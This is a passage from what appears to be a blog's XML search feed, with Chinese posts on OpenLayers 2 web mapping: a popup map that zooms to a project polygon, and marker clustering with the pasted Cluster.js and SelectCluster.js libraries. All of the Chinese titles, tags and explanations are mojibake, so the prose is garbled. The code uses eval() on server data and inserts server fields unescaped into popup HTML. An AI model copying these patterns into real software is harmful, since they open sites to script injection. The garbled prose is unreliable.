'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>Ubuntu</tag>
        <tag>ç³»ç»Ÿå¤‡ä»½</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å¼¹å‡ºåœ°å›¾å¹¶ç¼©æ”¾åˆ°æŒ‡å®šç»çº¬åº¦]]></title>
    <url>%2Fposts%2Fa208ada%2F</url>
    <content type="text"><![CDATA[ç‚¹å‡»ã€åœ°å›¾æŸ¥çœ‹ã€‘ï¼Œå¼¹å‡ºåœ°å›¾ï¼Œå¹¶ç¼©æ”¾åˆ°å½“å‰æŸä¸€xxçš„èŒƒå›´æ•ˆæœå¤§è‡´æ˜¯è¿™æ ·(å›¾æ²¡äº†)ï¼š å…ˆæŠŠå¼¹çª—çš„é¡µé¢å…ƒç´ å†™å‡ºæ¥ &lt;!--å¼¹å‡ºå±‚æ—¶èƒŒæ™¯å±‚DIV--> &lt;div id="fade" class="black_overlay"> &lt;/div> &lt;!-- ä¸»ä½“éƒ¨åˆ† --> &lt;div id="MyDiv" class="white_content"> &lt;div style="text-align: left; cursor: pointer; height: 40px; display:inline-block; float:left"> &lt;span style="font-size: 16px; font-weight:bold; line-height:40px;" id="dtval">&lt;/span> &lt;/div> &lt;div style="float:right; text-align: right; cursor: pointer; height: 40px; display:inline-block"> &lt;button type="button" class="close" style="font-size: 30px;font-weight: bold; background: none;border: none;outline: none;position: relative;right:6px;top:4px " onclick="CloseDiv('MyDiv','fade')" title="å…³é—­è¯¦æƒ…">Ã—&lt;/button> &lt;/div> &lt;iframe frameborder="0" id="iframepagemap" name="iframepage" scrolling="no" style="width: 100%;height: 100%;" src="">&lt;/iframe> &lt;/div> ç»‘å®šæŒ‰é’®çš„ç‚¹å‡»äº‹ä»¶ &lt;button type="button" class="btn btn-primary bottomBtn catMapBtn" onclick="ShowDiv('MyDiv','fade')">åœ°å›¾æŸ¥çœ‹&lt;/button> //ä¸¤ä¸ªå‚æ•° åˆ†åˆ«æ˜¯å¼¹å‡ºä¸»ä½“å’Œé®ç½©èƒŒæ™¯ çš„id jsæ–‡ä»¶ä¸­ï¼š å¼¹çª—æ–¹æ³• var initmap = false; //å¼¹å‡ºéšè—å±‚ function ShowDiv(show_div,bg_div){ document.getElementById(show_div).style.display='block'; document.getElementById(bg_div).style.display='block' ; var bgdiv = document.getElementById(bg_div); bgdiv.style.width = document.body.scrollWidth; // bgdiv.style.height = $(document).height(); $("#"+bg_div).height($(document).height()); var iframe = document.getElementById("iframepagemap"); if(!initmap){ $("#iframepagemap").attr("src","../map/map.jsp"); var i = 0; var finishmap = setInterval(function () { if (iframe.contentWindow.map!=null){ map = iframe.contentWindow.map; initM= iframe.contentWindow.initM; OpenLayers = iframe.contentWindow.OpenLayers; LayerSwitcherExt = iframe.contentWindow.LayerSwitcherExt; clearInterval(finishmap); initmap = true; // é¡¹ç›®èŒƒå›´ajax LonatDetail(xmNameStr); }else{ i++; } },100) }else{ // é¡¹ç›®èŒƒå›´ajax LonatDetail(xmNameStr); } }; è·å–é¡¹ç›®åŒºåŸŸçš„ajax function LonatDetail(xmNameStr){ $.ajax({ url:baseurl + "Program.action", type:"POST", data:{ method:"progremLonat", paramts:xmNameStr, }, dataType: "json", success: function(data){ addPolygon(data[0]['LONLAT']); }, error: function(msg){ alert("ajax Error!"); } }) } // ä»åå°æ‹¿åˆ°çš„dataä¸ºï¼š /* 0: {LONLAT: "[{"x":100.12341032715,"y":30.675432620386},{"x":12â€¦96102,"y":55.555}]"} */ åœ°å›¾èŒƒå›´çš„ç¼©æ”¾ä¸ç»˜åˆ¶é¢ // å¼¹å‡ºåœ°å›¾ç¼©æ”¾è‡³ function addPolygon(data){ data2 = eval("("+data+")"); //è§£æjsonå­—ç¬¦ä¸²ä¸ºjsonå¯¹è±¡ var paths = []; // å­˜å‚¨åæ ‡ for (var a = 0; a &lt; data2.length; a++) { var pf = new OpenLayers.Geometry.Point( data2[a]["x"], data2[a]["y"]); // ç‚¹çš„æ•°ç»„ paths.push(pf); } var stylePolyline = { //ç”»é¢çš„æ ·å¼ strokeWidth : 2, strokeOpacity : 0.8, strokeColor : "blue", fillColor : "white", fillOpacity : 0.5 }; // ç‚¹ç»„ç»‡æˆçº¿ var line = new OpenLayers.Geometry.LinearRing(paths); // ç”±çº¿ç»„ç»‡æˆé¢ var polygon = new OpenLayers.Geometry.Polygon(line); var featureLine = new OpenLayers.Feature.Vector(); featureLine.geometry = polygon; featureLine.style = stylePolyline; map.setLayerIndex(map.getLayer("drawLayer"), map.layers.length - 1); map.getLayer("drawLayer").removeAllFeatures(); map.getLayer("drawLayer").addFeatures(featureLine); lonlat = featureLine.geometry.getBounds().getCenterLonLat(); var zoom = map.getZoomForExtent(featureLine.geometry.getBounds()) - 1; if(zoom == 20){ zoom = 19; } map.setCenter(lonlat,zoom); //ç¼©æ”¾åˆ°lonlat, zoomæ˜¯èŒƒå›´å¤§å° }; å…³é—­å¼¹çª—çš„æ–¹æ³• //å…³é—­å¼¹å‡ºå±‚ function CloseDiv(show_div,bg_div) { document.getElementById(show_div).style.display='none'; document.getElementById(bg_div).style.display='none'; }; document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>GIS</category>
      </categories>
      <tags>
        <tag>GIS</tag>
        <tag>webgis</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ol2å®ç°åœ°å›¾èšåˆåŠŸèƒ½]]></title>
    <url>%2Fposts%2F698f7c9a%2F</url>
    <content type="text"><![CDATA[æŠ˜è…¾äº†å¥½ä¹…ï¼Œç»ˆäºæŠŠåœ°å›¾èšåˆç»™åšå‡ºæ¥äº†ï¼Œè¿™è¿˜å¾—æ„Ÿè°¢æ¨å§å§æœ€ç»ˆçš„æŒ‡ç‚¹ï¼ˆä¸å¯¹ï¼Œæ˜¯å¸®åŠ©äº†å¾ˆå¤šï¼‰ã€‚ä¸‹é¢æˆ‘å°±ç›´æ¥è´´ä»£ç äº†ã€‚ ä»£ç çš„ä¸»ç›®å½•æ˜¯è¿™æ ·çš„ï¼š( cluster.html &lt;!DOCTYPE html> &lt;html> &lt;head> &lt;title>OpenLayers Control/SelectCluster&lt;/title> &lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> &lt;link rel="stylesheet" href="style.css" /> &lt;script type="text/javascript" src="OpenLayers.js">&lt;/script> &lt;script type="text/javascript" src="Cluster.js">&lt;/script> &lt;script type="text/javascript" src="SelectCluster.js">&lt;/script> &lt;script type="text/javascript"> var map, clayer, ctrl; function initMap() // åˆå§‹åŒ–åœ°å›¾ï¼Œå¯ä»¥æ‹¿æ¥æ”¾åˆ°è‡ªå·±å¯¹åº”çš„ä½ç½® { // Nouvelle carte map = new OpenLayers.Map("map"); // OSM map.addLayer ( new OpenLayers.Layer.OSM() ); // Ajouter un controle pour les couches map.addControl(new OpenLayers.Control.LayerSwitcher()); // Centrer la carte var WGS84 = new OpenLayers.Projection('EPSG:4326'); map.setCenter(new OpenLayers.LonLat(2.424, 48.845).transform(WGS84, map.getProjectionObject()), 13); // Cluster layer's style var style = new OpenLayers.Style ({ pointRadius: 12, externalGraphic: "img/pins.png", backgroundGraphic: "img/pinsback.png", graphicYOffset:-24, backgroundXOffset: 0, backgroundYOffset: -16, graphicZIndex: 11, backgroundGraphicZIndex: 10, fillColor: "${fcolor}", //"#F0C20C", fillOpacity: 1, strokeColor: "#333", strokeWidth: 2, strokeOpacity: 1, labelSelect: false, //label: "${label}", //labelYOffset: "${labelOffset}", fontFamily: '"Luxi sans","Lucida Grande",Lucida,"Lucida Sans Unicode",sans-serif', fontSize: "${fSize}", fontWeight : "bold", cursor:"pointer" }, { context: { label: function(f) { if (f.cluster) return f.cluster.length ? f.cluster[0].attributes.n : ""; return f.attributes.n; }, labelOffset: function(f) { return (f.cluster &amp;&amp; f.cluster.length>1) ? "" : -8; }, fSize: function(f) { return (f.cluster &amp;&amp; f.cluster.length>1) ? 12 : 8; }, fcolor: function(f) { if (!f.cluster) return "#F0C20C"; if (f.cluster.length&lt;8) return "#AF7"; if (f.cluster.length&lt;16) return "#FD5"; return "#F97"; } } }); // New cluster Layer clayer = new OpenLayers.Layer.Cluster ("Clusters", { rendererOptions: {yOrdering: true}, styleMap: new OpenLayers.StyleMap ({ "default": style, "select": { pointRadius: 18 } }) }); // Add 200 features to cluster var b = map.calculateBounds(); var features = new Array(); for (var i = 0; i &lt; 200; i++) // æµ‹è¯•æ•°æ®ï¼Œæ›¿æ¢ä¸ºè‡ªå·±æ‹¿åˆ°çš„xyåæ ‡ { var r1 = Math.random(); var r2 = Math.random(); var px = b.left + (b.right-b.left) *r1 ; var py = b.bottom + (b.top-b.bottom) *r2 ; var f = new OpenLayers.Feature.Vector( new OpenLayers.Geometry.Point(px, py), {n:i} ); features.push(f); } map.addLayer(clayer); clayer.addFeatures(features); // Select control ctrl = new OpenLayers.Control.SelectCluster (clayer, { hover:false, pointRadius:12, animate:true, connect:false, onSelect: function(feature) { if (feature.cluster) feature = feature.cluster[0]; showStatus("selected feature "+feature.attributes.n+" ("+feature.id+")"); }, onUnselect: function(feature) { showStatus(""); }, }); map.addControl (ctrl); ctrl.activate(); } function showStatus(text) { document.getElementById("status").innerHTML = text; } &lt;/script> &lt;style> body { font:1em Helvetica,Arial,sans-serif; } h1 { color:#369; margin:0.5em 0 0.2em } #tags { color:#69F; font-size:0.9em; } p { margin: 0.5em 0; } p.title { color:#369; font-weight:bold; } #map { background:#fff; float:left; } #options { margin:0.5em; float:left; } #options p { margin:0 0 1em; } #docs { background:#e3e6e9; padding:0.5em; margin:0.5em 0; } .olControlAttribution { bottom:0; background:rgba(255,255,255,0.6); padding: 0 0.5em; } #status { display:block; clear:both; } &lt;/style> &lt;/head> &lt;body onload="initMap()"> &lt;!-- DIV pour la carte --> &lt;div id="map" style="width:600px; height:400px;">&lt;/div> &lt;p id="status"> &lt;/p> &lt;/body> &lt;/html> ä½†æ˜¯ç”±äºä¸šåŠ¡éœ€æ±‚ï¼Œéœ€è¦å†æ”¹åŠ¨ä¸€ä¸‹ æ·»åŠ ï¼šç‚¹å‡»åœ°å›¾è¦ç´ ï¼Œå¼¹å‡ºå…¶ä¿¡æ¯ï¼Œç‚¹å‡»å…¶ä»–åŒºåŸŸï¼Œä¸Šä¸€ä¸ªå¼¹çª—æ¶ˆå¤±ï¼š function loadJuhe(){ // Cluster layer's style var style = new OpenLayers.Style ({ pointRadius: 12, externalGraphic: "../../../otherlibs/ol2/img/pins.png", // è¦ç´ å›¾æ ‡ï¼Œæˆ‘è´´åœ¨åé¢ï¼Œä¹Ÿå¯ä»¥ç”¨è‡ªå·±çš„ backgroundGraphic: "../../../otherlibs/ol2/img/pinsback.png", graphicYOffset:-24, backgroundXOffset: 0, backgroundYOffset: -16, graphicZIndex: 11, backgroundGraphicZIndex: 10, fillColor: "${fcolor}", //"#F0C20C", fillOpacity: 1, strokeColor: "#333", strokeWidth: 2, strokeOpacity: 1, labelSelect: false, //label: "${label}", //labelYOffset: "${labelOffset}", fontFamily: '"Luxi sans","Lucida Grande",Lucida,"Lucida Sans Unicode",sans-serif', fontSize: "${fSize}", fontWeight : "bold", cursor:"pointer" }, { context: { label: function(f) { if (f.cluster) return f.cluster.length ? f.cluster[0].attributes.n : ""; return f.attributes.n; }, labelOffset: function(f) { return (f.cluster &amp;&amp; f.cluster.length>1) ? "" : -8; }, fSize: function(f) { return (f.cluster &amp;&amp; f.cluster.length>1) ? 12 : 8; }, fcolor: function(f) { if (!f.cluster) return "#F0C20C"; if (f.cluster.length&lt;8) return "#AF7"; if (f.cluster.length&lt;16) return "#FD5"; return "#F97"; } } }); // New cluster Layer clayer = new OpenLayers.Layer.Cluster ("Clusters", { rendererOptions: {yOrdering: true}, styleMap: new OpenLayers.StyleMap ({ "default": style, "select": { pointRadius: 18 } }) }); // Add 200 features to cluster var b = map.calculateBounds(); var features = new Array(); // $iframes.videodata for (var i = 0; i &lt; $iframes.videodata.length; i++) //$iframes.videsdataæ˜¯æˆ‘ä»åå°æ‹¿åˆ°çš„æ•°æ® { var f = new OpenLayers.Feature.Vector( new OpenLayers.Geometry.Point($iframes.videodata[i]['x'], $iframes.videodata[i]['y']), {n:i, itemdata : $iframes.videodata[i]} ); //itemdata æ˜¯æ¯ä¸€é¡¹çš„æ•°æ® features.push(f); } map.addLayer(clayer); clayer.addFeatures(features); // Select control ctrl = new OpenLayers.Control.SelectCluster (clayer, { hover:false, pointRadius:12, animate:true, connect:false, onSelect: function(feature) // å¼¹çª— { if (feature.cluster) feature = feature.cluster[0]; ctrl.onUnselect(); var popupContentHTML=""; //å¼¹çª—çš„é¡µé¢å…ƒç´  popupContentHTML += '&lt;div id="showTradeInfo" style="width:320px;background-color:rgb(255, 255, 255);height: auto;position:relative;">'; var data = feature.data.itemdata; // åå°æ•°æ®çš„æ¯ä¸€é¡¹ popupContentHTML += '&lt;div style="height:auto;line-height:36px;font-size: 14px; color: #4d4d4d;padding-left:10px;padding-right:10px; font-weight: 700;border-bottom:1px solid #ccc;">' popupContentHTML += '&lt;label style="margin-bottom:0px;">åç§°&lt;/label>ï¼š&lt;label style="margin-bottom:0px;font-weight:500;">'+data['name']+'&lt;/label>' popupContentHTML += '&lt;/div>'; popupContentHTML += '&lt;div style="height:auto;line-height:36px;font-size: 14px; color: #4d4d4d;padding-left:10px;padding-right:10px; font-weight: 700;border-bottom:1px solid #ccc;">' popupContentHTML += '&lt;label style="margin-bottom:0px;">åœ°å€&lt;/label>ï¼š&lt;label style="margin-bottom:0px;font-weight:500;">'+data["address"]+'&lt;/label>' popupContentHTML += '&lt;/div>'; popupContentHTML += '&lt;/div>'; var popup = new OpenLayers.Popup.CSSFramedCloud("MyFavorites", feature.geometry.getBounds().getCenterLonLat(),// åæ ‡ null,// popupå¤§å° popupContentHTML,// htmlå†…å®¹ null,// é”šç‚¹ true,// æ˜¯å¦æ˜¾ç¤ºå…³é—­æŒ‰é’® function() {// å…³é—­å¼¹çª—è§¦å‘è¯¥å›è°ƒå‡½æ•° // specialmap.removePopup(feature.popup); feature.popup.destroy(); feature.popup = null; }); popup.autoSize = true; feature.popup = popup; map.addPopup(popup); }, onUnselect: function(feature) // å–æ¶ˆå¼¹çª—æ²¡å†™ { for(var j=0; j&lt;map.popups.length; j++){ map.removePopup(map.popups[j]); j--; } // $("#clocePop").click(function(){ // removePopup(); // }); }, }); map.addControl (ctrl); ctrl.activate(); } ä¸‹é¢å‡ ä¸ªæ–‡ä»¶ç›´æ¥å¼•ç”¨å³å¯ï¼Œç›´æ¥è´´å‡ºæ¥ cluster.js /* Copyright (c) 2014 by Jean-Marc.Viglino [at]ign.fr * Dual-licensed under the CeCILL-B Licence (http://www.cecill.info/) * and the Beerware license (http://en.wikipedia.org/wiki/Beerware), * feel free to use and abuse it in your projects (the code, not the beer ;-). */ /** * Class: OpenLayers.Layer.Cluster * OpenLayers.Layer.Cluster is a OpenLayers.Layer.Vector with cluster stragegy and styling * * Inherits from: * - &lt;OpenLayers.Layer.Vector> */ OpenLayers.Layer.Cluster = OpenLayers.Class(OpenLayers.Layer.Vector, { /** * APIProperty: startegyParam * Properties for OpenLayers.Strategy.Cluster * and OpenLayers.Strategy.AnimatedCluster if included */ startegyParam: { /** * APIProperty: distance * {Integer} Pixel distance between features that should be considered a * single cluster. Default is 45 pixels. */ distance: 45, /** * APIProperty: animationMethod for animated cluster if included * https://github.com/acanimal/AnimatedCluster */ animationMethod: OpenLayers.Easing.Expo.easeOut, /** * APIProperty: animationDuration for animated cluster if included * https://github.com/acanimal/AnimatedCluster */ animationDuration: 30 }, /** * Constructor: OpenLayers.Layer.Cluster * Create a new cluster layer * * Parameters: * name - {String} A name for the layer * options - {Object} Optional object with non-default properties to set on * the layer. Use options.startegyParam to setup cluster strategy properties. * * Returns: * {&lt;OpenLayers.Layer.Vector>} A new vector layer */ initialize: function(name, options) { if (!options) options={}; var self = this; // var smap = options.styleMap; if (!smap) { options.styleMap = smap = new OpenLayers.StyleMap (OpenLayers.Util.extend({},OpenLayers.Feature.Vector.style)); } if (!smap.styles["default"].context) smap.styles["default"].context={}; // Overload a style function overrideStyle (s,f) { var f0, v0; // is a value v0 = smap.styles["default"].defaultStyle[s]; // is a function if (v0 &amp;&amp; v0.match) f0 = v0.match(/^\$\{(.*)\}$/); if (f0) f0 = smap.styles["default"].context[f0[1]]; // Override smap.styles["default"].defaultStyle[s] = "${"+s+"}"; smap.styles["default"].context[s] = function(feature) { if (feature.cluster &amp;&amp; self.countFeaturesInCluster(feature)>1) return f(feature); else return f0 ? f0(feature) : v0 ? v0 : ""; }; smap.styles["default"].propertyStyles[s] = true; } // Overload pointRadius var pointRadius = smap.styles["default"].defaultStyle.pointRadius || 3; var minRadius = smap.styles["default"].defaultStyle.minRadius || 6; var maxRadius = smap.styles["default"].defaultStyle.maxRadius || 30; var facRadius = smap.styles["default"].defaultStyle.facRadius || 1; // overrideStyle ("pointRadius", function(feature) { return Math.min(minRadius + (feature.attributes.count-1)*facRadius,maxRadius);}); overrideStyle ("pointRadius", function(feature) { return Math.min(minRadius + (self.countFeaturesInCluster(feature)-1)*facRadius,maxRadius);}); // Overload strokeWidth overrideStyle ("strokeWidth", function(feature) { return 10; }); // Overload strokeOpacity overrideStyle ("strokeOpacity", function(feature) { return 0.5; }); // Overload strokeColor var fillColor = smap.styles["default"].defaultStyle.fillColor; var fillColorFunction = null; if (fillColor &amp;&amp; fillColor.match) { fillColorFunction = fillColor.match(/^\$\{(.*)\}$/); if (fillColorFunction) fillColorFunction = smap.styles["default"].context[fillColorFunction[1]]; } overrideStyle ("strokeColor", function(feature) { return fillColorFunction ? fillColorFunction(feature) : fillColor; }); // Overload fillOpacity overrideStyle ("fillOpacity", function(feature) { return 1; }); // Overload externalGraphic overrideStyle ("externalGraphic", function(feature) { return ""; }); // Overload externalGraphic overrideStyle ("backgroundGraphic", function(feature) { return ""; }); // Overload label overrideStyle ("label", function(feature) { return self.countFeaturesInCluster(feature); }); var strategy; if (OpenLayers.Strategy.AnimatedCluster) strategy = OpenLayers.Strategy.AnimatedCluster else strategy = OpenLayers.Strategy.Cluster; var strategy_clusters = new strategy ({ distance: this.startegyParam.distance, animationMethod: this.startegyParam.animationMethod, animationDuration: this.startegyParam.animationDuration }); this.strategy_clusters = strategy_clusters; if (options.strategies) options.strategies.push(strategy_clusters); else options.strategies = [strategy_clusters]; OpenLayers.Layer.Vector.prototype.initialize.apply(this, [name, options]); }, /** Add new feature : the standard method remove existing features */ addFeatures: function (features) { if (!this.strategy_clusters.clustering) { var f = this.strategy_clusters.features; if (f) features = features.concat(f); } OpenLayers.Layer.Vector.prototype.addFeatures.apply(this, [features]); }, /** Refresh the layer : re-calculate the clusters */ refresh: function() { //this.strategy_clusters.clusters=null; this.strategy_clusters.resolution = 0; this.strategy_clusters.cluster(); }, /** Compact features at the same coords in a cluster to minimze number of features */ compact: function() { if (this.isCompact) return; var features = this.strategy_clusters.features; var clusters = []; var clustered; // Cluster features at the same coord for (var i=0; i&lt;features.length; i++) { feature = features[i]; if(feature.geometry) { clustered = false; for(var j=clusters.length-1; j>=0; --j) { cluster = clusters[j]; if(feature.geometry.getBounds().getCenterLonLat().equals(cluster.geometry.getBounds().getCenterLonLat())) { cluster.cluster.push(feature); cluster.attributes.count += 1; clustered = true; break; } } if (!clustered) { var center = feature.geometry.getBounds().getCenterLonLat(); var cluster = new OpenLayers.Feature.Vector( new OpenLayers.Geometry.Point(center.lon, center.lat), {count: 1} ); cluster.cluster = [feature]; clusters.push(cluster); } } } features = new Array(); var l = clusters.length; for (var i=0; i&lt;l; i++) { if (clusters[i].cluster &amp;&amp; clusters[i].attributes.count==1) features.push(clusters[i].cluster[0]); else features.push(clusters[i]); } // Add the new features OpenLayers.Layer.Vector.prototype.addFeatures.apply(this, [features]); this.isCompact = true; this.refresh(); }, /** Count number of feature in a cluster */ countFeaturesInCluster: function(feature) { if (feature.layer != this) return 1; if (feature.cluster) { // Normal cluster if (!this.isCompact) return feature.attributes.count; var c = 0; // Compact Cluster > count cluster of cluster for (var i=0; i&lt;feature.cluster.length; i++) { c += feature.cluster[i].cluster ? feature.cluster[i].attributes.count : 1; } return c; } // No cluster else return 1; }, /** Get the features in a cluster */ getFeaturesInCluster: function(feature) { if (feature.layer != this) return [feature]; if (feature.cluster) { // Normal cluster if (!this.isCompact) return feature.cluster; var f=new Array(); // Compact Cluster > count cluster of cluster for (var i=0; i&lt;feature.cluster.length; i++) { if (feature.cluster[i].cluster) { for (k=0; k&lt;feature.cluster[i].cluster.length; k++) f.push( feature.cluster[i].cluster[k] ) } else f.push( feature.cluster[i] ); } return f; } // No cluster else return [feature]; }, /** Cluster layer */ CLASS_NAME: "OpenLayers.Layer.Cluster" }); selectcluster.js /* Copyright (c) 2014 by Jean-Marc.Viglino [at]ign.fr * Dual-licensed under the CeCILL-B Licence (http://www.cecill.info/) * and the Beerware license (http://en.wikipedia.org/wiki/Beerware), * feel free to use and abuse it in your projects (the code, not the beer ;-). */ /** * Class: OpenLayers.Control.SelectCluster * The SelectCluster control selects vector features from a given * cluster layer on click or hover. * * Inherits from: * - &lt;OpenLayers.Control.SelectFeature> */ OpenLayers.Control.SelectCluster = OpenLayers.Class(OpenLayers.Control.SelectFeature, { /** * APIProperty: connect * {Boolean} Draw connection lines to the cluster. Default is false. */ connect: false, /** * APIProperty: animate * {Boolean} Play an animation. Default is false. */ animate:false, /** * APIProperty: animationDuration * {Integer} The number of steps to be passed to the OpenLayers.Tween.start() * method when the clusters are animated. * Default is 40. */ animationDuration: 40, /** * APIProperty: pointRadius * {Number} Radius of the points in the cluster. Default is 12. */ pointRadius: 12, /** * APIProperty: circleMaxObject * {Integer} Number of points to be drawn on a circle. Default is 10 */ circleMaxObject: 10, /** * APIProperty: spiral * {Boolean} Allow to draw point on a spiral when more than circleMaxObject. Default is true */ spiral: true, /** * APIProperty: maxPoint * {Boolean} Number of points to be drawn on a spiral. Default is 60 */ maxPoint: 60, /** * Property: animationTween * {OpenLayers.Tween} Tween for animation. */ animationTween: new OpenLayers.Tween(OpenLayers.Easing.Expo.easeOut), // Initialize the SelectCluster control initialize: function(layers, options) { if (!layers.length) layers = [layers]; var smap = layers[0].styleMap; // Add a new layer to store selection this.selLayer = new OpenLayers.Layer.Vector("Selection", { displayInLayerSwitcher: false, visibility:false, // Get the yOrdering for shadow on marker rendererOptions: layers[0].rendererOptions, styleMap: smap }); // Add this layer to selection layers.push(this.selLayer); // No box selection if (options) options.box = false; OpenLayers.Control.SelectFeature.prototype.initialize.apply(this, [layers, options]); }, /** * Method: setMap * Set the map property for the control. * * Parameters: * map - {&lt;OpenLayers.Map>} */ setMap: function(map) { OpenLayers.Control.SelectFeature.prototype.setMap.apply(this, arguments); map.addLayer(this.selLayer); map.events.register('movestart', this, function(e) { //if(e.zoomChanged) { this.unselectAll(); this.selLayer.setVisibility(false); } }); map.events.register('changelayer', this, function(e) { if ( e.property == "visibility" &amp;&amp; e.layer != this.selLayer &amp;&amp; OpenLayers.Util.indexOf(this.layers,e.layer) > -1 ) this.selLayer.setVisibility(false); }); }, /** * Method: select * If the feature is a cluster spread it out in selLayer. * Otherwise, do default action. * * Parameters: * feature - {&lt;OpenLayers.Feature.Vector>} */ select: function(feature) { // Don't spread twice if (feature == this.lastCluster &amp;&amp; this.selLayer.getVisibility()) return; var count=1; var layer = feature.layer; // Spread the cluster out if (feature.cluster) { this.lastCluster = feature; // Clear the Layer this.selLayer.removeAllFeatures(); this.selLayer.setVisibility(true); if (layer &amp;&amp; layer.countFeaturesInCluster) count = layer.countFeaturesInCluster(feature); else count = feature.cluster.attributes.count; } if (count>1) { // Pixel size in map unit var pix = feature.layer.map.resolution; var cluster = new Array();; if (layer &amp;&amp; layer.getFeaturesInCluster) { cluster = layer.getFeaturesInCluster(feature); } else cluster = feature.cluster; // Draw on a circle if (!this.spiral || cluster.length &lt;= this.circleMaxObject) { var r = pix * this.pointRadius * (0.5 + cluster.length / 4); var features = new Array(); var links = new Array(); var max = Math.min(cluster.length, this.circleMaxObject); // Features on a circle for (i=0; i&lt;max; i++) { // New feature var f = cluster[i].clone(); var a = 2*Math.PI*i/max; if (max==2 || max == 4) a += Math.PI/4; if (this.animate) { f.dataAnimate = { x0:feature.geometry.x, y0:feature.geometry.y, x1:feature.geometry.x+r*Math.sin(a), y1:feature.geometry.y+r*Math.cos(a) } } else f.geometry = new OpenLayers.Geometry.Point (feature.geometry.x+r*Math.sin(a), feature.geometry.y+r*Math.cos(a)); // Draw connection if (this.connect) { var f2 = cluster[i].clone(); f2.geometry = new OpenLayers.Geometry.LineString ( [ f.geometry , feature.geometry ]); links.push(f2); } features.push(f); } if (this.connect) this.selLayer.addFeatures(links); this.selLayer.addFeatures(features); } // Draw on a spiral else { // Angle de depart var a = 0; var r; var d = 2*this.pointRadius; var features = new Array(); var links = new Array(); var max = Math.min (this.maxPoint, cluster.length); // Feature on a spiral for (i=0; i&lt;max; i++) { // Nouveau rayon r = d/2 + d*a/(2*Math.PI); // Angle a = a + (d+0.1)/r; var dx = pix*r*Math.sin(a) var dy = pix*r*Math.cos(a) // New Feature var f = cluster[i].clone(); if (this.animate) { f.dataAnimate = { x0:feature.geometry.x, y0:feature.geometry.y, x1:feature.geometry.x+dx, y1:feature.geometry.y+dy } } else f.geometry = new OpenLayers.Geometry.Point (feature.geometry.x+dx, feature.geometry.y+dy); features.push(f); // Draw connection if (this.connect) { var f2 = cluster[i].clone(); f2.geometry = new OpenLayers.Geometry.LineString ( [ f.geometry , feature.geometry ]); links.push (f2); } } if (this.connect) this.selLayer.addFeatures(links); this.selLayer.addFeatures(features); } if (this.animate) { // Animation var self = this; this.animationTween.start ( {pos:0.0}, {pos:1.0}, this.animationDuration, { callbacks: { eachStep: function (delta) { self.doAnimation(delta); }, done: function (delta) { self.doAnimation(delta, true); } } } ); } } else { OpenLayers.Control.SelectFeature.prototype.select.apply(this, [feature]); } }, /** * Method: doAnimation * Calculate animation on the features in the layer. */ doAnimation: function (delta, last) { var pos = delta.pos; for (var i=0; i&lt;this.selLayer.features.length; i++) { var f = this.selLayer.features[i]; if (f.dataAnimate) { f.geometry.x = f.dataAnimate.x0 + (f.dataAnimate.x1 - f.dataAnimate.x0) *pos; f.geometry.y = f.dataAnimate.y0 + (f.dataAnimate.y1 - f.dataAnimate.y0) *pos; } if (pos==1.0) f.geometry.calculateBounds(); } this.selLayer.redraw(); }, /** * Method: clickoutFeature * Called on click outside a previously clicked (selected) feature. * Only responds if this.hover is false. * * Parameters: * feature - {&lt;OpenLayers.Vector.Feature>} */ clickoutFeature: function(feature) { if(!this.hover &amp;&amp; this.clickout) { this.selLayer.setVisibility(false); this.unselectAll(); } }, /** * Method: getSelection * Return the selected features. * * Parameters: * cluster - {Boolean} Get cluster features or original features (pay attention original features may have inconsistent layer). Default is false. */ getSelection: function(cluster) { var i, j; var sel = new Array(); for (i=0; i&lt;this.layers.length; i++) { var s = this.layers[i].selectedFeatures; for (j=0; j&lt;s.length; j++) { if (!cluster) { if (!s[j].cluster) sel.push(s[j]); else if (s[j].cluster.length == 1) sel.push(s[j].cluster[0]); } else sel.push(s[j]); } } return sel; }, CLASS_NAME: "OpenLayers.Layer.SelectCluster" }); OpenLayers.js å®˜æ–¹åº“ï¼Œä¹Ÿå¯ä»¥è‡ªè¡Œä¸‹è½½ ï¼Œå¾ˆé•¿ï¼Œä½†æ˜¯è¿˜æ˜¯æ”¾åˆ°è¿™é‡Œå§ /* OpenLayers.js -- OpenLayers Map Viewer Library Copyright (c) 2006-2013 by OpenLayers Contributors Published under the 2-clause BSD license. See http://openlayers.org/dev/license.txt for the full text of the license, and http://openlayers.org/dev/authors.txt for full list of contributors. Includes compressed code under the following licenses: (For uncompressed versions of the code used, please see the OpenLayers Github repository: &lt;https://github.com/openlayers/openlayers>) */ /** * Contains XMLHttpRequest.js &lt;http://code.google.com/p/xmlhttprequest/> * Copyright 2007 Sergey Ilinsky (http://www.ilinsky.com) * * Licensed under the Apache License, Version 2.0 (the "License"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * http://www.apache.org/licenses/LICENSE-2.0 */ /** * OpenLayers.Util.pagePosition is based on Yahoo's getXY method, which is * Copyright (c) 2006, Yahoo! Inc. * All rights reserved. * * Redistribution and use of this software in source and binary forms, with or * without modification, are permitted provided that the following conditions * are met: * * * Redistributions of source code must retain the above copyright notice, * this list of conditions and the following disclaimer. * * * Redistributions in binary form must reproduce the above copyright notice, * this list of conditions and the following disclaimer in the documentation * and/or other materials provided with the distribution. * * * Neither the name of Yahoo! Inc. nor the names of its contributors may be * used to endorse or promote products derived from this software without * specific prior written permission of Yahoo! Inc. * * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE * ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE * LIABLE FOR 